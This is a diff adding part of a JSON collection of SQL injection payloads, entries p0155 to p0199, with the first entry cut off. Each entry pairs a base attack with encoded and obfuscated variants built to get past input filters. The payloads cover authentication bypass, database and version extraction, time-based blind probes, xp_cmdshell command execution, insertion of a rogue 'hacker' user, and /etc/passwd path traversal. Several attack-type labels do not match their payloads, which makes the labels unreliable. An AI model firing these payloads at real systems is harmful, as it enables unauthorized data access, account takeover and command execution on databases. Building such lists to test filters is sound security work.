+      "'\nOR\n1=1\nAND\nrow(1,1)>(SeLeCt\nCOUNT(*),CONCAT(CHAR(58),CHAR(58),FLOOR(RAND(0)*2))x\nFROM\nINFORMATION_SCHEMA.PLUGINS\nGROUP\nBY\nx\nLIMIT\n1)#"
+    ],
+    "example_param": "category"
+  },
+  {
+    "payload_id": "p0155",
+    "base_payload": "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
+    "attack_type": "time-based",
+    "variants": [
+      "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--%00",
+      "' aND (Select * FroM (SEleCT(sLEeP(5)))A)--",
+      "%2527%2520AND%2520%2528SELECT%2520%252A%2520FROM%2520%2528SELECT%2528SLEEP%25285%2529%2529%2529a%2529--",
+      "'+AND+(SELECT+*+FROM+(SELECT(SLEEP(5)))a)--",
+      "'/**/AND/**/(SELECT/**/*/**/FROM/**/(SELECT(SLEEP(5)))a)--"
+    ],
+    "example_param": "id"
+  },
+  {
+    "payload_id": "p0156",
+    "base_payload": "(1' AND SLEEP(5)#)",
+    "attack_type": "time-based",
+    "variants": [
+      "(1' ANd sLeEp(5)#)",
+      "(1'+AND+SLEEP(5)#)",
+      "%25281%2527%2520AND%2520SLEEP%25285%2529%2523%2529",
+      "(1'\tAND\tSLEEP(5)#)",
+      "%281%27%20AND%20SLEEP%285%29%23%29"
+    ],
+    "example_param": "query"
+  },
+  {
+    "payload_id": "p0157",
+    "base_payload": "admin'/**/--",
+    "attack_type": "boolean",
+    "variants": [
+      "YWRtaW4nLyoqLy0t",
+      "admin%2527/%252A%252A/--",
+      "admin'/**/--",
+      "%61%64%6d%69%6e%27%2f%2a%2a%2f%2d%2d",
+      "admin'/**/--"
+    ],
+    "example_param": "user"
+  },
+  {
+    "payload_id": "p0158",
+    "base_payload": "1' OR pg_sleep(5)-- AND 1=1",
+    "attack_type": "time-based",
+    "variants": [
+      "%31%27%20%4f%52%20%70%67%5f%73%6c%65%65%70%28%35%29%2d%2d%20%41%4e%44%20%31%3d%31",
+      "MScgT1IgcGdfc2xlZXAoNSktLSBBTkQgMT0x",
+      "1'%20OR%20pg_sleep(5)--%20AND%201=1",
+      "1' OR pg_sleep(5)-- AND 1=1%00",
+      "1'/**/OR/**/pg_sleep(5)--/**/AND/**/1=1"
+    ],
+    "example_param": "query"
+  },
+  {
+    "payload_id": "p0159",
+    "base_payload": "' OR '1'='1' #",
+    "attack_type": "boolean",
+    "variants": [
+      "'/**/OR/**/'1'='1'/**/#",
+      "'+OR+'1'='1'+#",
+      "' or '1'='1' #",
+      "' OR '1'='1' #%00",
+      "'\tOR\t'1'='1'\t#"
+    ],
+    "example_param": "username"
+  },
+  {
+    "payload_id": "p0160",
+    "base_payload": "1' Or '1'='1' LIMIT 1--",
+    "attack_type": "boolean",
+    "variants": [
+      "1%2527%2520Or%2520%25271%2527%253D%25271%2527%2520LIMIT%25201--",
+      "1'+Or+'1'='1'+LIMIT+1--",
+      "1'\tOr\t'1'='1'\tLIMIT\t1--",
+      "1'/**/Or/**/'1'='1'/**/LIMIT/**/1--",
+      "1'\nOr\n'1'='1'\nLIMIT\n1--"
+    ],
+    "example_param": "id"
+  },
+  {
+    "payload_id": "p0161",
+    "base_payload": "1' UNION SeLeCt database(),user(),version()--",
+    "attack_type": "union",
+    "variants": [
+      "1'%20UNION%20SeLeCt%20database(),user(),version()--",
+      "1'\tUNION\tSeLeCt\tdatabase(),user(),version()--",
+      "1%2527%2520UNION%2520SeLeCt%2520database%2528%2529%252Cuser%2528%2529%252Cversion%2528%2529--",
+      "1%27%20UNION%20SeLeCt%20database%28%29%2Cuser%28%29%2Cversion%28%29--",
+      "MScgVU5JT04gU2VMZUN0IGRhdGFiYXNlKCksdXNlcigpLHZlcnNpb24oKS0t"
+    ],
+    "example_param": "id"
+  },
+  {
+    "payload_id": "p0162",
+    "base_payload": "' OR 1=1#",
+    "attack_type": "boolean",
+    "variants": [
+      "'+OR+1=1#",
+      "JyBPUiAxPTEj",
+      "%2527%2520OR%25201%253D1%2523",
+      "' OR 1=1#%00",
+      "%27%20%4f%52%20%31%3d%31%23"
+    ],
+    "example_param": "username"
+  },
+  {
+    "payload_id": "p0163",
+    "base_payload": "' OR 1--",
+    "attack_type": "boolean",
+    "variants": [
+      "JyBPUiAxLS0=",
+      "'%20OR%201--",
+      "%27%20OR%201--",
+      "%27%20%4f%52%20%31%2d%2d",
+      "' OR 1--"
+    ],
+    "example_param": "user"
+  },
+  {
+    "payload_id": "p0164",
+    "base_payload": "' AND multipoint((select * from (select * from (select version())a)b))--",
+    "attack_type": "error",
+    "variants": [
+      "'%20AND%20multipoint((select%20*%20from%20(select%20*%20from%20(select%20version())a)b))--",
+      "'\nAND\nmultipoint((select\n*\nfrom\n(select\n*\nfrom\n(select\nversion())a)b))--",
+      "%27%20%41%4e%44%20%6d%75%6c%74%69%70%6f%69%6e%74%28%28%73%65%6c%65%63%74%20%2a%20%66%72%6f%6d%20%28%73%65%6c%65%63%74%20%2a%20%66%72%6f%6d%20%28%73%65%6c%65%63%74%20%76%65%72%73%69%6f%6e%28%29%29%61%29%62%29%29%2d%2d",
+      "' AND multipoint((select * from (select * from (select version())a)b))--%00",
+      "' And MuLTIpoInt((sELECt * frOm (seLect * FroM (SElECt VeRSioN())A)B))--"
+    ],
+    "example_param": "category"
+  },
+  {
+    "payload_id": "p0165",
+    "base_payload": "' AND gtid_subset(version(),1)--",
+    "attack_type": "error",
+    "variants": [
+      "'+AND+gtid_subset(version(),1)--",
+      "'\tAND\tgtid_subset(version(),1)--",
+      "%27%20AND%20gtid_subset%28version%28%29%2C1%29--",
+      "%27%20%41%4e%44%20%67%74%69%64%5f%73%75%62%73%65%74%28%76%65%72%73%69%6f%6e%28%29%2c%31%29%2d%2d",
+      "'%20AND%20gtid_subset(version(),1)--"
+    ],
+    "example_param": "filter"
+  },
+  {
+    "payload_id": "p0166",
+    "base_payload": "(' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--)",
+    "attack_type": "time-based",
+    "variants": [
+      "(' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--)%00",
+      "('\tAND\t(SELECT\t*\tFROM\t(SELECT(SLEEP(5)))a)--)",
+      "('/**/AND/**/(SELECT/**/*/**/FROM/**/(SELECT(SLEEP(5)))a)--)",
+      "('\nAND\n(SELECT\n*\nFROM\n(SELECT(SLEEP(5)))a)--)",
+      "KCcgQU5EIChTRUxFQ1QgKiBGUk9NIChTRUxFQ1QoU0xFRVAoNSkpKWEpLS0p"
+    ],
+    "example_param": "query"
+  },
+  {
+    "payload_id": "p0167",
+    "base_payload": "1' AND SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END",
+    "attack_type": "blind",
+    "variants": [
+      "MScgQU5EIFNFTEVDVCBDQVNFIFdIRU4gKDE9MSkgVEhFTiAxIEVMU0UgMCBFTkQ=",
+      "%31%27%20%41%4e%44%20%53%45%4c%45%43%54%20%43%41%53%45%20%57%48%45%4e%20%28%31%3d%31%29%20%54%48%45%4e%20%31%20%45%4c%53%45%20%30%20%45%4e%44",
+      "1'%20AND%20SELECT%20CASE%20WHEN%20(1=1)%20THEN%201%20ELSE%200%20END",
+      "1' AND SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END%00",
+      "1' AnD sELEcT cAsE wheN (1=1) THEn 1 eLse 0 end"
+    ],
+    "example_param": "id"
+  },
+  {
+    "payload_id": "p0168",
+    "base_payload": "(' UNION SeLeCt * FROM (SeLeCt NULL,NULL,NULL)a--)",
+    "attack_type": "union",
+    "variants": [
+      "('\nUNION\nSeLeCt\n*\nFROM\n(SeLeCt\nNULL,NULL,NULL)a--)",
+      "('\tUNION\tSeLeCt\t*\tFROM\t(SeLeCt\tNULL,NULL,NULL)a--)",
+      "KCcgVU5JT04gU2VMZUN0ICogRlJPTSAoU2VMZUN0IE5VTEwsTlVMTCxOVUxMKWEtLSk=",
+      "%2528%2527%2520UNION%2520SeLeCt%2520%252A%2520FROM%2520%2528SeLeCt%2520NULL%252CNULL%252CNULL%2529a--%2529",
+      "%28%27%20UNION%20SeLeCt%20%2A%20FROM%20%28SeLeCt%20NULL%2CNULL%2CNULL%29a--%29"
+    ],
+    "example_param": "page"
+  },
+  {
+    "payload_id": "p0169",
+    "base_payload": "..;/..;/..;/etc/passwd",
+    "attack_type": "path-injection",
+    "variants": [
+      "..;/..;/..;/etc/passwd",
+      "%2e%2e%3b%2f%2e%2e%3b%2f%2e%2e%3b%2f%65%74%63%2f%70%61%73%73%77%64",
+      "..;/..;/..;/etc/passwd",
+      "..;/..;/..;/etc/passwd",
+      "..;/..;/..;/etc/passwd%00"
+    ],
+    "example_param": "path"
+  },
+  {
+    "payload_id": "p0170",
+    "base_payload": "' Or 'a'='a",
+    "attack_type": "boolean",
+    "variants": [
+      "'+Or+'a'='a",
+      "%27%20Or%20%27a%27%3D%27a",
+      "' Or 'a'='a%00",
+      "%27%20%4f%72%20%27%61%27%3d%27%61",
+      "'\nOr\n'a'='a"
+    ],
+    "example_param": "q"
+  },
+  {
+    "payload_id": "p0171",
+    "base_payload": "' OR 1--",
+    "attack_type": "boolean",
+    "variants": [
+      "%2527%2520OR%25201--",
+      "'/**/OR/**/1--",
+      "'%20OR%201--",
+      "%27%20%4f%52%20%31%2d%2d",
+      "%27%20OR%201--"
+    ],
+    "example_param": "user"
+  },
+  {
+    "payload_id": "p0172",
+    "base_payload": "' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT('~',version())) USING utf8)))--",
+    "attack_type": "error",
+    "variants": [
+      "%27%20%41%4e%44%20%4a%53%4f%4e%5f%4b%45%59%53%28%28%53%45%4c%45%43%54%20%43%4f%4e%56%45%52%54%28%28%53%45%4c%45%43%54%20%43%4f%4e%43%41%54%28%27%7e%27%2c%76%65%72%73%69%6f%6e%28%29%29%29%20%55%53%49%4e%47%20%75%74%66%38%29%29%29%2d%2d",
+      "%27%20AND%20JSON_KEYS%28%28SELECT%20CONVERT%28%28SELECT%20CONCAT%28%27~%27%2Cversion%28%29%29%29%20USING%20utf8%29%29%29--",
+      "'\tAND\tJSON_KEYS((SELECT\tCONVERT((SELECT\tCONCAT('~',version()))\tUSING\tutf8)))--",
+      "'+AND+JSON_KEYS((SELECT+CONVERT((SELECT+CONCAT('~',version()))+USING+utf8)))--",
+      "' aND json_KEYS((sEleCt ConVeRT((seleCt Concat('~',VERSiOn())) USIng utF8)))--"
+    ],
+    "example_param": "category"
+  },
+  {
+    "payload_id": "p0173",
+    "base_payload": "';/**/EXEC/**/master..xp_cmdshell/**/'whoami'--",
+    "attack_type": "stacked",
+    "variants": [
+      "';/**/EXEC/**/master..xp_cmdshell/**/'whoami'--%00",
+      "%27%3B/%2A%2A/EXEC/%2A%2A/master..xp_cmdshell/%2A%2A/%27whoami%27--",
+      "';/**/EXEC/**/master..xp_cmdshell/**/'whoami'--",
+      "';/**/EXEC/**/master..xp_cmdshell/**/'whoami'--",
+      "';/**/EXEC/**/master..xp_cmdshell/**/'whoami'--"
+    ],
+    "example_param": "action"
+  },
+  {
+    "payload_id": "p0174",
+    "base_payload": "' OR 1=1/*",
+    "attack_type": "boolean",
+    "variants": [
+      "%2527%2520OR%25201%253D1/%252A",
+      "'\nOR\n1=1/*",
+      "' OR 1=1/*%00",
+      "'+OR+1=1/*",
+      "'%20OR%201=1/*"
+    ],
+    "example_param": "q"
+  },
+  {
+    "payload_id": "p0175",
+    "base_payload": "1 Or 1=1 LIMIT 1",
+    "attack_type": "boolean",
+    "variants": [
+      "1\tOr\t1=1\tLIMIT\t1",
+      "1+Or+1=1+LIMIT+1",
+      "MSBPciAxPTEgTElNSVQgMQ==",
+      "1 Or 1=1 LIMIT 1%00",
+      "1\nOr\n1=1\nLIMIT\n1"
+    ],
+    "example_param": "search"
+  },
+  {
+    "payload_id": "p0176",
+    "base_payload": "('; INSERT INTO users VALUES('hacker','pass')--)",
+    "attack_type": "stacked",
+    "variants": [
+      "%2528%2527%253B%2520INSERT%2520INTO%2520users%2520VALUES%2528%2527hacker%2527%252C%2527pass%2527%2529--%2529",
+      "(';\nINSERT\nINTO\nusers\nVALUES('hacker','pass')--)",
+      "KCc7IElOU0VSVCBJTlRPIHVzZXJzIFZBTFVFUygnaGFja2VyJywncGFzcycpLS0p",
+      "%28%27%3b%20%49%4e%53%45%52%54%20%49%4e%54%4f%20%75%73%65%72%73%20%56%41%4c%55%45%53%28%27%68%61%63%6b%65%72%27%2c%27%70%61%73%73%27%29%2d%2d%29",
+      "%28%27%3B%20INSERT%20INTO%20users%20VALUES%28%27hacker%27%2C%27pass%27%29--%29"
+    ],
+    "example_param": "command"
+  },
+  {
+    "payload_id": "p0177",
+    "base_payload": "(' OR 'x'='x)",
+    "attack_type": "boolean",
+    "variants": [
+      "('\tOR\t'x'='x)",
+      "('/**/OR/**/'x'='x)",
+      "%28%27%20OR%20%27x%27%3D%27x%29",
+      "('\nOR\n'x'='x)",
+      "KCcgT1IgJ3gnPSd4KQ=="
+    ],
+    "example_param": "id"
+  },
+  {
+    "payload_id": "p0178",
+    "base_payload": "' OR polygon((select * from(select * from(select version())a)b))#",
+    "attack_type": "error",
+    "variants": [
+      "%2527%2520OR%2520polygon%2528%2528select%2520%252A%2520from%2528select%2520%252A%2520from%2528select%2520version%2528%2529%2529a%2529b%2529%2529%2523",
+      "JyBPUiBwb2x5Z29uKChzZWxlY3QgKiBmcm9tKHNlbGVjdCAqIGZyb20oc2VsZWN0IHZlcnNpb24oKSlhKWIpKSM=",
+      "%27%20%4f%52%20%70%6f%6c%79%67%6f%6e%28%28%73%65%6c%65%63%74%20%2a%20%66%72%6f%6d%28%73%65%6c%65%63%74%20%2a%20%66%72%6f%6d%28%73%65%6c%65%63%74%20%76%65%72%73%69%6f%6e%28%29%29%61%29%62%29%29%23",
+      "'\tOR\tpolygon((select\t*\tfrom(select\t*\tfrom(select\tversion())a)b))#",
+      "'\nOR\npolygon((select\n*\nfrom(select\n*\nfrom(select\nversion())a)b))#"
+    ],
+    "example_param": "id"
+  },
+  {
+    "payload_id": "p0179",
+    "base_payload": "'/**/UNION/**/ALL/**/SELECT/**/NULL--",
+    "attack_type": "union",
+    "variants": [
+      "'/**/UNION/**/ALL/**/SELECT/**/NULL--",
+      "'/**/UNION/**/ALL/**/SELECT/**/NULL--%00",
+      "'/**/UNION/**/ALL/**/SELECT/**/NULL--",
+      "%2527/%252A%252A/UNION/%252A%252A/ALL/%252A%252A/SELECT/%252A%252A/NULL--",
+      "%27%2f%2a%2a%2f%55%4e%49%4f%4e%2f%2a%2a%2f%41%4c%4c%2f%2a%2a%2f%53%45%4c%45%43%54%2f%2a%2a%2f%4e%55%4c%4c%2d%2d"
+    ],
+    "example_param": "page"
+  },
+  {
+    "payload_id": "p0180",
+    "base_payload": "999' UNION SeLeCt 1,2,3,4,5,6,7,8,9,10--",
+    "attack_type": "union",
+    "variants": [
+      "999' UNioN SelEct 1,2,3,4,5,6,7,8,9,10--",
+      "999'\nUNION\nSeLeCt\n1,2,3,4,5,6,7,8,9,10--",
+      "%39%39%39%27%20%55%4e%49%4f%4e%20%53%65%4c%65%43%74%20%31%2c%32%2c%33%2c%34%2c%35%2c%36%2c%37%2c%38%2c%39%2c%31%30%2d%2d",
+      "OTk5JyBVTklPTiBTZUxlQ3QgMSwyLDMsNCw1LDYsNyw4LDksMTAtLQ==",
+      "999%27%20UNION%20SeLeCt%201%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10--"
+    ],
+    "example_param": "product_id"
+  },
+  {
+    "payload_id": "p0181",
+    "base_payload": "'/**/OR/**/'1'/**/LIKE/**/'1",
+    "attack_type": "boolean",
+    "variants": [
+      "'/**/OR/**/'1'/**/LIKE/**/'1",
+      "%2527/%252A%252A/OR/%252A%252A/%25271%2527/%252A%252A/LIKE/%252A%252A/%25271",
+      "'/**/OR/**/'1'/**/LIKE/**/'1",
+      "Jy8qKi9PUi8qKi8nMScvKiovTElLRS8qKi8nMQ==",
+      "%27%2f%2a%2a%2f%4f%52%2f%2a%2a%2f%27%31%27%2f%2a%2a%2f%4c%49%4b%45%2f%2a%2a%2f%27%31"
+    ],
+    "example_param": "id"
+  },
+  {
+    "payload_id": "p0182",
+    "base_payload": "' UNION SELECT 1,2,3--",
+    "attack_type": "union",
+    "variants": [
+      "'\tUNION\tSELECT\t1,2,3--",
+      "'\nUNION\nSELECT\n1,2,3--",
+      "' UNiOn seLect 1,2,3--",
+      "%27%20UNION%20SELECT%201%2C2%2C3--",
+      "'+UNION+SELECT+1,2,3--"
+    ],
+    "example_param": "product_id"
+  },
+  {
+    "payload_id": "p0183",
+    "base_payload": "' Or 'a'='a",
+    "attack_type": "boolean",
+    "variants": [
+      "'\tOr\t'a'='a",
+      "' oR 'a'='A",
+      "%2527%2520Or%2520%2527a%2527%253D%2527a",
+      "%27%20Or%20%27a%27%3D%27a",
+      "JyBPciAnYSc9J2E="
+    ],
+    "example_param": "search"
+  },
+  {
+    "payload_id": "p0184",
+    "base_payload": "(1' AND SLEEP(5)#) AND 1=1",
+    "attack_type": "time-based",
+    "variants": [
+      "%281%27%20AND%20SLEEP%285%29%23%29%20AND%201%3D1",
+      "(1'\tAND\tSLEEP(5)#)\tAND\t1=1",
+      "%25281%2527%2520AND%2520SLEEP%25285%2529%2523%2529%2520AND%25201%253D1",
+      "KDEnIEFORCBTTEVFUCg1KSMpIEFORCAxPTE=",
+      "%28%31%27%20%41%4e%44%20%53%4c%45%45%50%28%35%29%23%29%20%41%4e%44%20%31%3d%31"
+    ],
+    "example_param": "query"
+  },
+  {
+    "payload_id": "p0185",
+    "base_payload": "admin' OR '1'='1",
+    "attack_type": "boolean",
+    "variants": [
+      "YWRtaW4nIE9SICcxJz0nMQ==",
+      "admiN' oR '1'='1",
+      "admin'\nOR\n'1'='1",
+      "admin' OR '1'='1%00",
+      "admin%2527%2520OR%2520%25271%2527%253D%25271"
+    ],
+    "example_param": "user"
+  },
+  {
+    "payload_id": "p0186",
+    "base_payload": "'/**/AND/**/(SELECT/**/*/**/FROM/**/(SELECT(SLEEP(0)))a)--",
+    "attack_type": "error",
+    "variants": [
+      "'/**/AND/**/(SELECT/**/*/**/FROM/**/(SELECT(SLEEP(0)))a)--",
+      "%2527/%252A%252A/AND/%252A%252A/%2528SELECT/%252A%252A/%252A/%252A%252A/FROM/%252A%252A/%2528SELECT%2528SLEEP%25280%2529%2529%2529a%2529--",
+      "'/**/anD/**/(sELECT/**/*/**/froM/**/(SELeCt(sleep(0)))A)--",
+      "Jy8qKi9BTkQvKiovKFNFTEVDVC8qKi8qLyoqL0ZST00vKiovKFNFTEVDVChTTEVFUCgwKSkpYSktLQ==",
+      "%27%2f%2a%2a%2f%41%4e%44%2f%2a%2a%2f%28%53%45%4c%45%43%54%2f%2a%2a%2f%2a%2f%2a%2a%2f%46%52%4f%4d%2f%2a%2a%2f%28%53%45%4c%45%43%54%28%53%4c%45%45%50%28%30%29%29%29%61%29%2d%2d"
+    ],
+    "example_param": "category"
+  },
+  {
+    "payload_id": "p0187",
+    "base_payload": "1/**/OR/**/1=1",
+    "attack_type": "boolean",
+    "variants": [
+      "1/%252A%252A/OR/%252A%252A/1%253D1",
+      "1/**/OR/**/1=1",
+      "1/**/OR/**/1=1%00",
+      "1/%2A%2A/OR/%2A%2A/1%3D1",
+      "1/**/OR/**/1=1"
+    ],
+    "example_param": "search"
+  },
+  {
+    "payload_id": "p0188",
+    "base_payload": "' Or 'a'='a",
+    "attack_type": "boolean",
+    "variants": [
+      "' oR 'a'='A",
+      "%27%20%4f%72%20%27%61%27%3d%27%61",
+      "'\nOr\n'a'='a",
+      "'\tOr\t'a'='a",
+      "JyBPciAnYSc9J2E="
+    ],
+    "example_param": "username"
+  },
+  {
+    "payload_id": "p0189",
+    "base_payload": "((('; EXEC master..xp_cmdshell 'whoami'--)))",
+    "attack_type": "stacked",
+    "variants": [
+      "(((';+EXEC+master..xp_cmdshell+'whoami'--)))",
+      "(((';\tEXEC\tmaster..xp_cmdshell\t'whoami'--)))",
+      "KCgoJzsgRVhFQyBtYXN0ZXIuLnhwX2NtZHNoZWxsICd3aG9hbWknLS0pKSk=",
+      "%28%28%28%27%3B%20EXEC%20master..xp_cmdshell%20%27whoami%27--%29%29%29",
+      "(((';/**/EXEC/**/master..xp_cmdshell/**/'whoami'--)))"
+    ],
+    "example_param": "command"
+  },
+  {
+    "payload_id": "p0190",
+    "base_payload": "1' OR '1'='1' LIMIT 1--",
+    "attack_type": "boolean",
+    "variants": [
+      "1'/**/OR/**/'1'='1'/**/LIMIT/**/1--",
+      "1'\tOR\t'1'='1'\tLIMIT\t1--",
+      "1%27%20OR%20%271%27%3D%271%27%20LIMIT%201--",
+      "MScgT1IgJzEnPScxJyBMSU1JVCAxLS0=",
+      "%31%27%20%4f%52%20%27%31%27%3d%27%31%27%20%4c%49%4d%49%54%20%31%2d%2d"
+    ],
+    "example_param": "username"
+  },
+  {
+    "payload_id": "p0191",
+    "base_payload": "'/**/AND/**/(SELECT/**/*/**/FROM/**/(SELECT(SLEEP(0)))a)--",
+    "attack_type": "error",
+    "variants": [
+      "Jy8qKi9BTkQvKiovKFNFTEVDVC8qKi8qLyoqL0ZST00vKiovKFNFTEVDVChTTEVFUCgwKSkpYSktLQ==",
+      "'/**/AND/**/(SELECT/**/*/**/FROM/**/(SELECT(SLEEP(0)))a)--",
+      "%27/%2A%2A/AND/%2A%2A/%28SELECT/%2A%2A/%2A/%2A%2A/FROM/%2A%2A/%28SELECT%28SLEEP%280%29%29%29a%29--",
+      "'/**/AND/**/(SELECT/**/*/**/FROM/**/(SELECT(SLEEP(0)))a)--",
+      "'/**/AND/**/(SELECT/**/*/**/FROM/**/(SELECT(SLEEP(0)))a)--%00"
+    ],
+    "example_param": "category"
+  },
+  {
+    "payload_id": "p0192",
+    "base_payload": "(1' AND SLEEP(5)#)",
+    "attack_type": "time-based",
+    "variants": [
+      "(1'+AND+SLEEP(5)#)",
+      "%28%31%27%20%41%4e%44%20%53%4c%45%45%50%28%35%29%23%29",
+      "%25281%2527%2520AND%2520SLEEP%25285%2529%2523%2529",
+      "(1' AND SLEEP(5)#)%00",
+      "(1'/**/AND/**/SLEEP(5)#)"
+    ],
+    "example_param": "user_id"
+  },
+  {
+    "payload_id": "p0193",
+    "base_payload": "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
+    "attack_type": "time-based",
+    "variants": [
+      "%27%20AND%20%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29a%29--",
+      "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--%00",
+      "'\nAND\n(SELECT\n*\nFROM\n(SELECT(SLEEP(5)))a)--",
+      "'+AND+(SELECT+*+FROM+(SELECT(SLEEP(5)))a)--",
+      "JyBBTkQgKFNFTEVDVCAqIEZST00gKFNFTEVDVChTTEVFUCg1KSkpYSktLQ=="
+    ],
+    "example_param": "user_id"
+  },
+  {
+    "payload_id": "p0194",
+    "base_payload": "'; WAITFOR DELAY '0:0:5'--",
+    "attack_type": "time-based",
+    "variants": [
+      "%2527%253B%2520WAITFOR%2520DELAY%2520%25270%253A0%253A5%2527--",
+      "JzsgV0FJVEZPUiBERUxBWSAnMDowOjUnLS0=",
+      "%27%3B%20WAITFOR%20DELAY%20%270%3A0%3A5%27--",
+      "';+WAITFOR+DELAY+'0:0:5'--",
+      "%27%3b%20%57%41%49%54%46%4f%52%20%44%45%4c%41%59%20%27%30%3a%30%3a%35%27%2d%2d"
+    ],
+    "example_param": "user_id"
+  },
+  {
+    "payload_id": "p0195",
+    "base_payload": "1' OR '1'='1",
+    "attack_type": "path-injection",
+    "variants": [
+      "%31%27%20%4f%52%20%27%31%27%3d%27%31",
+      "1'\tOR\t'1'='1",
+      "1'+OR+'1'='1",
+      "1%2527%2520OR%2520%25271%2527%253D%25271",
+      "1'%20OR%20'1'='1"
+    ],
+    "example_param": "file"
+  },
+  {
+    "payload_id": "p0196",
+    "base_payload": "(admin' --)",
+    "attack_type": "boolean",
+    "variants": [
+      "(admin'\t--)",
+      "(admin'%20--)",
+      "%2528admin%2527%2520--%2529",
+      "%28%61%64%6d%69%6e%27%20%2d%2d%29",
+      "(admin'+--)"
+    ],
+    "example_param": "q"
+  },
+  {
+    "payload_id": "p0197",
+    "base_payload": "' OR BENCHMARK(5000000,MD5('A'))-- AND 1=1",
+    "attack_type": "time-based",
+    "variants": [
+      "' Or BEnChMaRK(5000000,MD5('A'))-- and 1=1",
+      "%2527%2520OR%2520BENCHMARK%25285000000%252CMD5%2528%2527A%2527%2529%2529--%2520AND%25201%253D1",
+      "'%20OR%20BENCHMARK(5000000,MD5('A'))--%20AND%201=1",
+      "'/**/OR/**/BENCHMARK(5000000,MD5('A'))--/**/AND/**/1=1",
+      "%27%20OR%20BENCHMARK%285000000%2CMD5%28%27A%27%29%29--%20AND%201%3D1"
+    ],
+    "example_param": "user_id"
+  },
+  {
+    "payload_id": "p0198",
+    "base_payload": "(1' AND SLEEP(5)#)",
+    "attack_type": "time-based",
+    "variants": [
+      "(1'\tAND\tSLEEP(5)#)",
+      "(1'\nAND\nSLEEP(5)#)",
+      "(1'/**/AND/**/SLEEP(5)#)",
+      "%28%31%27%20%41%4e%44%20%53%4c%45%45%50%28%35%29%23%29",
+      "KDEnIEFORCBTTEVFUCg1KSMp"
+    ],
+    "example_param": "user_id"
+  },
+  {
+    "payload_id": "p0199",
+    "base_payload": "(' Or 'a'='a)",
+    "attack_type": "boolean",
+    "variants": [
+      "('%20Or%20'a'='a)",
+      "('\nOr\n'a'='a)",
+      "('+Or+'a'='a)",
+      "('/**/Or/**/'a'='a)",
+      "(' Or 'a'='A)"
+    ],
+    "example_param": "username"
+  }
+]
